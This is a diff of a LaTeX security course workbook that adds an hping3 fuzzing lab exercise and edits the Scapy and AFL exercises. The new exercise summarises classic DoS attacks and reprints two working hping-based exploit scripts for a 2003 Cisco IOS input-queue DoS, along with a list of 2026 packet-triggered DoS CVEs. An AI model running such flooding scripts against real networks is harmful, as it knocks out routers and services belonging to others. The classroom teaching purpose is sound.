@@ -2501,8 +2501,6 @@ Receiving systems, and those en route to the service, should be checked for reso
 
 
 
-\end{document}
-
 
 \chapter{\faExclamationTriangle\ Django String Handling 20min}
 \label{ex:django-string}
@@ -2673,7 +2671,7 @@ How to produce fuzz like output?\\
 Hint; \url{https://scapy.readthedocs.io/en/latest/usage.html?highlight=fuzz#fuzzing}
 
 {\bf Hints:}\\
-Scapy requires very little Python knowledge, also the protocols are "stacked" after each others. The example includes multiple layers of encapsulation.
+Scapy requires very little Python knowledge, also the protocols are "stacked" after each others. This example includes multiple layers of encapsulation.
 
 \begin{minted}[fontsize=\footnotesize]{python}
 
@@ -2700,10 +2698,174 @@ Scapy might not be the quickest tool. It can write packets to a binary pcap file
 
 
 
-\chapter{\faExclamationTriangle\ Try American fuzzy lop up to 60min}
+\chapter{\faInfoCircle\ Using hping3 as a fuzzer 45min}
+\label{ex:hping3-fuzzer}
+
+{\bf Objective:}\\
+Start using the tool hping3 creatively.
+
+{\bf Purpose:}\\
+See how easy it is to produce packets on a network using hacker programs.
+
+The tool we will use is very flexible and can produce ICMP, UDP and TCP using very few options. This tool is my primary one for doing professsional DDoS testing.
+
+Here we want to use it as a \emph{fuzzer}
+
+{\bf Suggested method:}\\
+Connect to the LAB network and send packets, try different options
+
+You can try different scenarios like setting the source and destination to the SAME IP.
+
+
+\begin{list2}
+\item \textbf{LAND (1997)} --- spoofed TCP SYN with source
+      address/port set equal to the destination; the target
+      replies to itself and locks up or crashes.
+\item \textbf{Ping of Death (1996)} --- fragmented ICMP echo
+      that reassembles to more than 65{,}535 bytes, overflowing
+      the IP reassembly buffer and crashing the stack.
+\item \textbf{Teardrop (1997)} --- overlapping IP fragments with
+      malformed offsets; the reassembly code miscalculates and
+      crashes the kernel.
+\item \textbf{Smurf (1998)} --- ICMP echo sent to a broadcast
+      address with the victim's address spoofed as source;
+      every host replies, amplifying the flood onto the victim.
+\end{list2}
+
+
+Lookup older Denial of Service (DoS) attacks \textbf{Cisco DoS \emph{exploit} script} like this old one from
+CVE-2003-0567 -- Cisco IOS input queue wedge via crafted IPv4 protocol 53/55/77/103 packets\\
+\link{https://nvd.nist.gov/vuln/detail/CVE-2003-0567}
+
+
+Note: using hping and not hping3, so syntax might not work directly, but for inspiration!
+
+
+
+\begin{alltt}\scriptsize
+#!/bin/tcsh -f
+#
+# Remote DoS exploit against the recent Cisco IOS vuln. Cisco doc. 44020
+# Vulnerable versions - all Cisco devices running IOS.
+# Requirements : tcsh, and hping.
+# Get hping @ www.hping.org
+#
+# And you know the best part? This script actually works! Unlike the few .c's
+# floating around the net. Uses swipe for the protocol bit. Also, need to be uid=0,
+# OR +s ciscodos.sh because of hping opening raw sockets.
+#
+# Example :
+#
+# root@evicted # ping 192.168.1.1
+# PING 192.168.1.1 (192.168.1.1): 56 data bytes
+# 64 bytes from 192.168.1.1: icmp_seq=0 ttl=150 time=1.287 ms
+# 64 bytes from 192.168.1.1: icmp_seq=1 ttl=150 time=0.817 ms
+# --- 192.168.1.1 ping statistics ---
+# 2 packets transmitted, 2 packets received, 0% packet loss
+# round-trip min/avg/max/std-dev = 0.817/1.052/1.287/0.235 ms
+#
+# root@evicted # ./ciscodos.sh 192.168.1.1 0
+# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes
+# --- 192.168.1.1 hping statistic ---
+# 19 packets tramitted, 0 packets received, 100% packet loss
+# round-trip min/avg/max = 0.0/0.0/0.0 ms
+# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes
+# --- 192.168.1.1 hping statistic ---
+# 19 packets tramitted, 0 packets received, 100% packet loss
+# round-trip min/avg/max = 0.0/0.0/0.0 ms
+# -------------SNIP---------------
+# root@evicted # ping 192.168.1.1
+# PING 192.168.1.1 (192.168.1.1): 56 data bytes
+# --- 192.168.1.1 ping statistics ---
+# 2 packets transmitted, 0 packets received, 100% packet loss
+# -------------SNIP---------------
+#
+# Coded by zerash@evicted.org
+#
+
+if ($1 == "" || $2 == "") then
+echo "usage: $0 <router hostname|address> <ttl>"
+exit
+endif
+
+foreach protocol (53 55 77 103)
+/usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto $protocol --count 76 --interval u250 --data 26
+end
+
+# milw0rm.com [2003-07-22]
+\end{alltt}
+
+another version:
+\begin{alltt}\scriptsize
+\small
+#!/bin/sh
+# 2003-07-21 pdonahue
+# cisco-44020.sh
+# -- this shell script is just a wrapper for hping (http://www.hping.org)
+#    with the parameters necessary to fill the input queue on
+# exploitable IOS device
+# -- refer to "Cisco Security Advisory: Cisco IOS Interface Blocked by
+# IPv4 Packets"
+# (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
+#for more information
+...
+for protocol in $PROT
+    do
+       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
+       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
+    done
+\end{alltt}
+
+{\bf Hints:}\\
+The tool we use can do a lot of different things, and you can control the speed. You can measure at the server being attacked or what you are sending, commonly using ifpps or such programs can help.
+
+Consider 2026, and these bugs -- would someone, like you, be able to send such packets?
+
+Linux kernel --- remote, packet-triggered DoS (2026)
+\begin{list2}
+\item \textbf{CVE-2026-23398} --- remote kernel panic from a single
+      crafted ICMP ``Fragmentation Needed'' error (ICMP type 3,
+      code 4).\\
+      \url{https://access.redhat.com/security/cve/CVE-2026-23398}
+\item \textbf{CVE-2026-46306} --- remote DoS via a crafted PPPoE
+      Protocol-Field-Compression (PFC) frame.\\
+      \url{https://access.redhat.com/security/cve/CVE-2026-46306}
+\item \textbf{CVE-2026-31517} --- crafted packets mishandled during
+      IP-TFS reassembly cause an invalid kernel buffer operation.\\
+      \url{https://access.redhat.com/security/cve/CVE-2026-31517}
+\item \textbf{CVE-2026-31685} --- malformed network packets crash the
+      kernel remotely.\\
+      \url{https://access.redhat.com/security/cve/CVE-2026-31685}
+\end{list2}
+
+Windows TCP/IP --- remote / adjacent DoS (May 2026 Patch Tuesday)
+\begin{list2}
+\item \textbf{CVE-2026-40405} --- unauthenticated remote DoS; crafted
+      TCP/IP packets trigger a NULL pointer dereference in the
+      Windows TCP/IP stack.\\
+      \url{https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-40405}
+
+\item \textbf{CVE-2026-40413} --- adjacent-network attacker crashes the
+      stack via a NULL pointer dereference; reported exploited in the
+      wild.\\
+      \url{https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-40413}
+\item \textbf{CVE-2026-59132} --- a specially crafted packet triggers a
+      NULL pointer dereference (Windows 10 1607).\\
+      \url{https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-59132}
+\end{list2}
+
+{\bf Solution:}\\
+When your team has sent \emph{funny packets} into the network, from one or two laptops - you are done.
+
+{\bf Discussion:}\\
+Gigabit Ethernet can send up to 1.4 million packets per second, pps.
+
+\chapter{\faExclamationTriangle\ Try American fuzzy lop up to 45min}
 \label{ex:american-fuzzy-lop}
 
 Try American fuzzy lop from \link{http://lcamtuf.coredump.cx/afl/}
+
+\textbf{Note: This exercise can be really annoying! Work in groups and help eachother out!}
 
 {\bf Objective:}\\
 Try a fuzzer. We will use the popular american fuzzy lop named after a breed of rabits.
@@ -2733,13 +2895,15 @@ Later if you like, modify our demo.c test program from earlier, and fuzz it.
 Look at the many projects which have been tested by AFL, the \emph{bug-o-rama trophy case} on the web page.
 
 {\bf Solution:}\\
-When afl is installed on at least one laptop on the team, and has run a fuzzing session against a program - no matter if it found anything.
+When afl is installed on at least one laptop on the team, and has run a fuzzing session against a program - no matter if it found anything. If it doesn't want to work, that is a result too! Then let it be!
 
 {\bf Discussion:}\\
 For how long is it reasonable to fuzz a program? A few days - sure. Maybe run multiple sessions in parallel!
 
 
 
+
+\end{document}
 
 
 
